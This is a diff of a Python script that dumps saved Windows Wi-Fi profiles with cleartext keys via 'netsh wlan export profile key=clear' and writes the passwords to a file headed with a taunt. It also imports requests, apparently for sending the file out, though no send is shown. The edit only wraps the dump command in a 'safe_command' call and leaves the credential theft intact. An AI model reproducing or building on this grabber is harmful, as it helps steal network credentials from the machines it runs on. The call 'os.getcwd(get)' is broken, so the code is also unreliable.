@@ -2,6 +2,7 @@
 import subprocess
 import os
 import requests
+from security import safe_command
 
 passwordFile = open('passwords.txt', 'w')
 passwordFile.write("Here them passwords, dipshit: \n\n\n")
@@ -11,7 +12,7 @@ wifiFiles = []
 wifiPasswords = []
 wifiNames = []
 
-command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()
+command = safe_command.run(subprocess.run, ["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()
 
 path = os.getcwd(get)
 
